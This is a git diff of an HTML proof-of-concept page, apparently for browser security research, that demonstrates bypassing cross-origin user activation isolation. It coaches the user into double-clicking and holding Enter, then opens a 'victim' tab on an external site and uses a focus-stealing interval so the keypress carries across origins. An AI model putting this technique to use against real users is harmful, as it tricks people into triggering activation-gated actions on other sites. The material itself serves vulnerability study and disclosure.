@@ -1,25 +1,32 @@
 <!DOCTYPE html>
 <html>
-
 <body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">
-    
 
     <h1>Bypass of Cross-Origin User Activation Isolation</h1>
-<button id="pre-focus-btn" style="padding: 10px 20px; font-size: 16px; margin-bottom: 20px; cursor: pointer; background: #444; color: white; border: none; border-radius: 4px;">
-        Click 2x and Enter
+    
+    <button id="pre-focus-btn" style="padding: 10px 20px; font-size: 16px; margin-bottom: 10px; cursor: pointer; background: #444; color: white; border: none; border-radius: 4px;">
+        1. Click 2x Here
     </button>
-    <div style="border: 2px dashed #ff4444; padding: 20px; background: white;">
-        <p>1. Click anywhere to focus this page.</p>
-        <p>2. <b>Press & HOLD the "Enter" key</b></p>
-        <p>3. Keep holding while the new page opens</p>
+
+    <br>
+
+    <button id="enter-btn" style="padding: 20px 40px; font-size: 20px; margin-bottom: 20px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 8px; font-weight: bold;">
+        2. Press & HOLD "Enter" Key Here
+    </button>
+
+    <div style="border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 500px; margin: 0 auto;">
+        <p><b>Instructions:</b></p>
+        <p>1. Double click the dark button.</p>
+        <p>2. Hover/Click the red button, then <b>Press & HOLD Enter</b>.</p>
+        <p>3. Keep holding while the target tab opens and focus returns here.</p>
     </div>
 
     <script>
         const targetURL = "https://cape-poc.vercel.app/";
         let opened = false;
-
+        let victim = null;
         document.getElementById('pre-focus-btn').addEventListener('dblclick', () => {
-            console.log("[*] Button double-clicked. Page focused.");
+            console.log("[*] Button double-clicked. Interaction primed.");
             window.focus();
         });
 
@@ -29,12 +36,11 @@
 
             opened = true;
             console.log("[*] Keydown detected. Opening target...");
-
-            const victim = window.open(targetURL, "_blank");
-
+            victim = window.open(targetURL, "_blank");
             const focusInterval = setInterval(() => {
                 if (!victim || victim.closed) {
                     clearInterval(focusInterval);
+                    opened = false;
                     return;
                 }
 
@@ -45,5 +51,4 @@
         });
     </script>
 </body>
-
 </html>
